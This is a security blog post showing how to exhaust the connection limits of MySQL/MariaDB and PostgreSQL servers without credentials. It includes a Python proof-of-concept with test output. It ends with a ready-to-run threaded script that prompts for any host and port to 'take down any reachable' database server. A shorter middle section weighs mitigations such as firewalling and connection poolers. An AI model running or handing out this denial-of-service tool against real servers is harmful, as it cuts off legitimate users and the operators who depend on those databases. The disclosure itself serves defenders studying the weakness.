---
layout: post
title: "How to DoS MySQL/MariaDB and PostgresSQL Servers With Fewer Than 55kb of Data"
author: "Joshua Rogers"
categories: security
---

At the heart of any Denial of Service (DoS) attack, there are two variables: a resource, and the limit of which that resource can grow to: network bandwidth, processing power, connection limits, and so on.
Traditionally, in any successful DoS attack an attacker needs to use of at least the same resource for which they are attacking.
For example, if you're performing a DoS attack on a server with a 10GbE uplink, an attacker will need attack with 10Gb/s of resources to exhaust the resources of the uplink.

That's why I was surprised to discover that it's incredibly easy to DoS MySQL/MariaDB and PostgresSQL servers with very few resources. In this case, the resource that can be exhausted is the number of connections to the database itself.

---

I was recently reading the documentation for PostgresSQL. Specifically, the _max_connections_ attribute: _max_connections (integer)_: _Determines the maximum number of concurrent connections to the database server. The default is typically 100 connections, but might be less if your kernel settings will not support it (as determined during initdb). This parameter can only be set at server start._

It made me wonder: is it possible to open 100 connections to a PostgresSQL database and let it idle, denying service to legitimate connections of the database? As it turns out, yes, and __even without credentials to access any database__: as long as the SQL server is reachable and it can receive our TCP packets, we can easily deny access to it for legitimate users.

---

I made a quick script to open 100 connections to a local PostgresSQL server:

```python
import socket
import struct
import concurrent.futures

host = '127.0.0.1'
port = 5432

def postgres_connect(host, port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((host, port))

                startup_message = b'\x00\x03\x00\x00user\x001\x00database\x001\x00\x00'
                message_length = len(startup_message) + 4
                message_length_bytes = struct.pack('!I', message_length)
                sock.sendall(message_length_bytes + startup_message)

                while True:
                    sock.recv(1)

        except Exception as e:
            print(e)

if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(postgres_connect, host, port) for _ in range(100)]

        for future in concurrent.futures.as_completed(futures):
            pass
```

and then tested whether I could connect:
```bash
# python3 py.py  &
[1] 1611
# psql -U user -ww -h 127.0.0.1 -d database
psql: error: connection to server at "127.0.0.1", port 5432 failed: FATAL:  sorry, too many clients already
connection to server at "127.0.0.1", port 5432 failed: FATAL:  sorry, too many clients already
```

So despite not having any authentication data for the server, we can still DoS it.

---

How much data does this consume in total?
```
# tcpdump -i any -s 0 -w captured_traffic.pcap 'port 5432'
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
^C700 packets captured
1400 packets received by filter
0 packets dropped by kernel
# tshark -r captured_traffic.pcap -Y "tcp.port == 5432" -T fields -e frame.len | awk '{ sum += $1 } END { print "Total data transferred:", sum / 1024, "KB" }'
Total data transferred: 53.0273 KB
```


So with just 53KB of data, we can totally exhaust PostgresSQL's connection limit. This isn't a rate of data exchange either, as the connection only needs to be left open: data does not need to be sent or received.

---

I ended up testing MySQL/MariaDB too, and as it turns, we can DoS those servers quite easily as well. A [bug report from 2006](https://bugs.mysql.com/bug.php?id=16227) outlines the same issue, but it remains "unfixed". But is it really a bug? That's an open question.

---

In some cases, there can be either a (legitimate or not) reason to have an SQL server accessible either via the internet or within some private network which may contain illegitimate users. Data in a database doesn't always have to be private, and may be publicly accessible. So how can we stop this attack? Well it's seemingly quite difficult.

We could raise the _max_connections_ limit, but then an attacker can just open more connections. We could use stateful firewalling like Linux's iptables to rate-limit connections, but then an attacker could perform a spoofed syn-flood from a single server [which could overflow the conntrack table](https://blog.cloudflare.com/conntrack-tales-one-thousand-and-one-flows/). Some middleware like pgbouncer or pgpool could also be effective, but then who knows whether we would just exhaust the [connection limit for those softwares](https://www.pgbouncer.org/config.html#max_client_conn).

One might be able to hack away at the source of MySQL/MariaDB or PostgresSQL and not count unauthenticated requests in the _max_connections_ count, but then we might just be able to exhaust the open file descriptor limits. On my system, MariaDB has both soft and hard limits of 32768 ([which is configurable](https://dev.mysql.com/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_open-files-limit)). :
```
# sudo systemctl show mariadb | grep LimitNOFILE
LimitNOFILE=32768
LimitNOFILESoft=32768
```

On my system with PostgresSQL, the soft and hard limits are 1024 and 4096 respectively via ulimit. In reality, this limit is 1000 by default, as [the postgres daemon has an option](https://www.postgresql.org/docs/current/runtime-config-resource.html#GUC-MAX-FILES-PER-PROCESS) to ensure the soft limit won't be reached.
```
# cat /proc/$(ps ax | grep '/[p]ostgres' | awk '{print $1}')/limits | grep 'Max open files'
Max open files            1024                 4096                 files
# grep -nrI 'max_files_per_process' /etc/postgresql
/etc/postgresql/15/main/postgresql.conf:166:#max_files_per_process = 1000		# min 64
```

All of these limits can easily be exhausted.


All in all, I don't have much of a solution here. Monitoring and proactively DROPing any addresses which have too many connections open might be an option, but it's certainly not a good one.


---

I also made a short script which can take down any reachable MySQL/MariaDB and PostgresSQL server:

```python
import socket
import struct
import concurrent.futures

def postgres_connect(host, port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((host, port))

                startup_message = b'\x00\x03\x00\x00user\x001\x00database\x001\x00\x00'
                message_length = len(startup_message) + 4
                message_length_bytes = struct.pack('!I', message_length)
                sock.sendall(message_length_bytes + startup_message)

                while True:
                    sock.recv(1)

        except Exception as e:
            print(e)

def mysql_connect(host, port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((host, port))
                while True:
                    sock.recv(1)

        except Exception as e:
            print(e)

if __name__ == "__main__":
    host = input("Enter the server host: ")
    port = int(input("Enter the server port: "))
    num_threads = int(input("Enter the number of threads: "))
    function_choice = input("Enter 'postgres' or 'mysql' to select the function to run: ")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        if function_choice == 'postgres':
            futures = [executor.submit(postgres_connect, host, port) for _ in range(num_threads)]
        elif function_choice == 'mysql':
            futures = [executor.submit(mysql_connect, host, port) for _ in range(num_threads)]
        else:
            print("Invalid function choice. Please enter 'postgres' or 'mysql'.")

        # Wait for all threads to finish
        for future in concurrent.futures.as_completed(futures):
            pass
```

